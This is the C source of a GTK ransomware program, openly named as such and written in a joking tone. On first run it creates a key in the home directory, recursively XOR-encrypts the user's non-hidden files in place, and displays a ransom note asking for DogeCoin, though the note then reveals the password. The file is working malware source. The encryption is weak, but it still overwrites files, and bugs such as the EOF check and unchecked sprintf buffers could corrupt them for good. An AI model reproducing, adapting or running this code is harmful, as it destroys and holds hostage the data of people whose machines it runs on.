#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <gtk/gtk.h>

#define RANSOM_NAME "ransomware"
#define KEY_NAME ".RANSOM_KEY"
#define PASSWORD "password"
#define HOME getenv("HOME")
#define KEY_SIZE 4096
#define BUF_SIZE 128

struct dirent_node {
    struct dirent de;
    struct dirent_node *next;
};

static void activate(GtkApplication *app, gpointer user_data);
void on_entry_activate(GtkEntry *entry, gpointer user_data);
int gen_key(char *key_path);
struct dirent_node *create_list(char *dir_path);
void destroy_list(struct dirent_node *list);
int encrypt_file(const char *file_name);
int encrypt_dir(const char *dir_path);

int decrypting = 0;

int main(int argc, char *argv[])
{
    FILE *key;
    char buf[BUF_SIZE];
    int status;
    GtkApplication *app;

    srand(time(NULL));
    sprintf(buf, "%s/%s", HOME, KEY_NAME);
    key = fopen(buf, "r");

    if (key == NULL) {
        gen_key(buf);
        sprintf(buf, "%s/%s", HOME, RANSOM_NAME);
        rename(argv[0], buf);    
        sprintf(buf, "%s/%s", HOME, ".pics");
        rename("./.pics", buf);
        encrypt_dir(HOME);
    } else
        fclose(key);

    app = gtk_application_new("com.gitub.German-SCP-049.Ransomware", 
            G_APPLICATION_DEFAULT_FLAGS);
    g_signal_connect(app, "activate", G_CALLBACK(activate), NULL);
    status = g_application_run(G_APPLICATION(app), argc, argv);
    g_object_unref(app);

    return status;
}

void on_entry_activate(GtkEntry *entry, gpointer user_data)
{
    char buf[BUF_SIZE];
    GtkEntryBuffer *entry_buf = gtk_entry_get_buffer(entry);
    GtkAlertDialog *response;
    GtkWidget *window = GTK_WIDGET(entry);

    while (gtk_widget_get_parent(window) != NULL)
        window = gtk_widget_get_parent(window);

    if (strcmp(PASSWORD,
            gtk_entry_buffer_get_text(GTK_ENTRY_BUFFER(entry_buf))) == 0 &&
            decrypting == 0) {
        decrypting = 1;
        response = gtk_alert_dialog_new("Ok, decrypting your stuff...\n"
                "This window will close automatically when it's finished.");
        gtk_alert_dialog_show(response, GTK_WINDOW(window));
        encrypt_dir(HOME);
        gtk_window_close(GTK_WINDOW(window));
        sprintf(buf, "%s/%s", HOME, KEY_NAME);
        remove(buf);
        sprintf(buf, "%s/%s", HOME, RANSOM_NAME);
        remove(buf);
        sprintf(buf, "%s/%s", HOME, ".pics/pov.png");
        remove(buf);
        sprintf(buf, "%s/%s", HOME, ".pics/devastated.png");
        remove(buf);
        sprintf(buf, "%s/%s", HOME, ".pics");
        rmdir(buf);
    } else if (decrypting == 0) {
        response = gtk_alert_dialog_new("Wrong!");
        gtk_alert_dialog_show(response, GTK_WINDOW(window));
    }
}

static void activate(GtkApplication *app, gpointer user_data)
{
    char buf[BUF_SIZE];
    GtkWidget *window;
    GtkWidget *box_h1, *box_v1, *box_v2, *box_v3;
    GtkWidget *header, *separator1, *separator2, *content_container, *content,
            *password_label, *password_entry, *link;
    GtkWidget *image1, *image2;
    GtkTextIter start;
    GtkTextBuffer *content_buf;
    char* content_text =
            "<span size=\"x-large\">What is this?\n</span>"
            "As you may have read from the header, all your personal files\n"
            "have been encrypted. I highly advise you leave them alone\n"
            "for the time being, as to preserve their data safely.\n\n"

            "<span size=\"x-large\">Why did you do this?\n</span>"
            "Because I want money lol\n\n"

            "<span size=\"x-large\">How can I get my files back?\n</span>"
            "All you have to do is pay me 67 DogeCoin. You must also give\n"
            "up your favorite NFT so I can distribute screenshots of it\n"
            "for free\n\n"

            "<span size=\"x-large\">Where do I pay?\n</span>"
            "Yea so, I haven't actually gotten around to setting up a\n"
            "crypto wallet or any sort of contact information, so you're\n"
            "kinda screwed\n\n"
            "If you need those files for work or something, just tell\n"
            "your boss you got Dunked On (will trademark after setting\n"
            "up the wallet)\n\n"
            "If it's your personal files, then I'd feel bad for\n"
            "withholding them without a way to get them back,\n"
            "so the password is \"password\"\n";

    /* WINDOW */
    window = gtk_application_window_new(app);
    gtk_window_set_title(GTK_WINDOW(window), "GetDunkedOn");
    gtk_window_set_default_size(GTK_WINDOW(window), 640, 480);

    /* BOX VERTICAL 1 */
    box_v1 = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    gtk_window_set_child(GTK_WINDOW(window), box_v1);

    /* HEADER */
    header = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(header), 
            "<span foreground=\"red\" background=\"black\" size=\"xx-large\">"
            "Your files have been encrypted!!1!</span>");
    gtk_box_append(GTK_BOX(box_v1), header);

    /* BOX HORIZONTAL 1 */
    box_h1 = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
    gtk_box_append(GTK_BOX(box_v1), box_h1);

    /* BOX VERTICAL 2 AND 3 */
    box_v2 = gtk_box_new(GTK_ORIENTATION_VERTICAL, 30);
    box_v3 = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    separator1 = gtk_separator_new(GTK_ORIENTATION_VERTICAL);
    gtk_box_append(GTK_BOX(box_h1), box_v2);
    gtk_box_append(GTK_BOX(box_h1), separator1);
    gtk_box_append(GTK_BOX(box_h1), box_v3);

    /* IMAGES */
    sprintf(buf, "%s/%s", HOME, ".pics/devastated.png");
    image1 = gtk_picture_new_for_filename(buf);
    sprintf(buf, "%s/%s", HOME, ".pics/pov.png");
    image2 = gtk_picture_new_for_filename(buf);
    gtk_box_append(GTK_BOX(box_v2), image1);
    gtk_box_append(GTK_BOX(box_v2), image2);

    /* CONTENT */
    content_container = gtk_scrolled_window_new();
    content_buf = gtk_text_buffer_new(NULL);
    gtk_text_buffer_get_start_iter(GTK_TEXT_BUFFER(content_buf), &start);
    gtk_text_buffer_insert_markup(content_buf, &start, content_text, -1);
    content = gtk_text_view_new_with_buffer(content_buf);
    gtk_text_view_set_editable(GTK_TEXT_VIEW(content), FALSE);
    gtk_scrolled_window_set_child(GTK_SCROLLED_WINDOW(content_container),
            content);
    gtk_scrolled_window_set_min_content_width(
            GTK_SCROLLED_WINDOW(content_container), 400);
    gtk_scrolled_window_set_min_content_height(
            GTK_SCROLLED_WINDOW(content_container), 300);
    gtk_box_append(GTK_BOX(box_v3), content_container);

    /* PASSWORD ENTRY */
    password_label = gtk_label_new(
            "Enter the password to decrypt your files:");
    password_entry = gtk_entry_new();
    g_signal_connect(password_entry, "activate", G_CALLBACK(on_entry_activate), 
            NULL);
    gtk_box_append(GTK_BOX(box_v3), password_label);
    gtk_box_append(GTK_BOX(box_v3), password_entry);

    /* LINK */
    separator2 = gtk_separator_new(GTK_ORIENTATION_HORIZONTAL);
    link = gtk_link_button_new_with_label("https://github.com/German-SCP-049", 
            "Made by SCP-049");
    gtk_widget_set_halign(link, GTK_ALIGN_END);
    gtk_box_append(GTK_BOX(box_v3), separator2);
    gtk_box_append(GTK_BOX(box_v3), link);

    gtk_window_present(GTK_WINDOW(window));
}

int gen_key(char *key_path)
{
    FILE *key = fopen(key_path, "wb");
    if (key == NULL)
        return 1;

    for (size_t i = 0; i < KEY_SIZE; i++) {
        fputc(rand() % 127, key);
    }

    fclose(key);
    return 0;
}

struct dirent_node *create_list(char *dir_path)
{
    DIR *dir = opendir(dir_path);
    struct dirent_node *list = malloc(sizeof(struct dirent_node));
    struct dirent_node *node = list;
    struct dirent *de;
    
    if (dir == NULL || list == NULL) {
        closedir(dir);
        free(list);
        return NULL;
    }

    for (;;) {
        node->next = malloc(sizeof(struct dirent_node));
        if ((de = readdir(dir)) == NULL) {
            free(node->next);
            node->next = NULL;
            break;
        } else {
            node->de = *de;
            node = node->next;
        }
    }

    closedir(dir);
    return list;
}

void destroy_list(struct dirent_node *list)
{
    struct dirent_node *node = list;
    struct dirent_node *prev_node;

    while (node->next != NULL) {
        prev_node = node;
        node = node->next;
        free(prev_node);
    }
    free(node);
}

int encrypt_file(const char *file_name)
{
    char key_name[BUF_SIZE];
    sprintf(key_name, "%s/%s", HOME, KEY_NAME);
    FILE *file = fopen(file_name, "rb+");
    FILE *key = fopen(key_name, "r");
    char ch;

    if (file == NULL && key == NULL)
        return 1;
    else if (file == NULL) {
        fclose(key);
        return 1;
    } else if (key == NULL) {
        fclose(file);
        return 1;
    }
    
    while ((ch = fgetc(file)) != EOF) {
        if (ftell(key) == KEY_SIZE)
            fseek(key, 0, SEEK_SET);
        fseek(file, -1, SEEK_CUR);
        fputc(ch ^ fgetc(key), file);
    }

    fclose(file);
    fclose(key);
    return 0;
}

int encrypt_dir(const char *dir_path)
{
    struct dirent_node *list = create_list(dir_path);
    struct dirent_node *node = list;
    char buf[BUF_SIZE];

    while (node->next != NULL) {
        if (strcmp(node->de.d_name, RANSOM_NAME) == 0 ||
            strcmp(node->de.d_name, KEY_NAME) == 0 ||
            node->de.d_name[0] == '.') {
            node = node->next;
            continue;
        }
        else if (node->de.d_type == DT_DIR) {
            sprintf(buf, "%s/%s", dir_path, node->de.d_name);
            encrypt_dir(buf);
        } else {
            sprintf(buf, "%s/%s", dir_path, node->de.d_name);
            encrypt_file(buf);
        }
        node = node->next;
    }

    destroy_list(list);
    return 0;
}

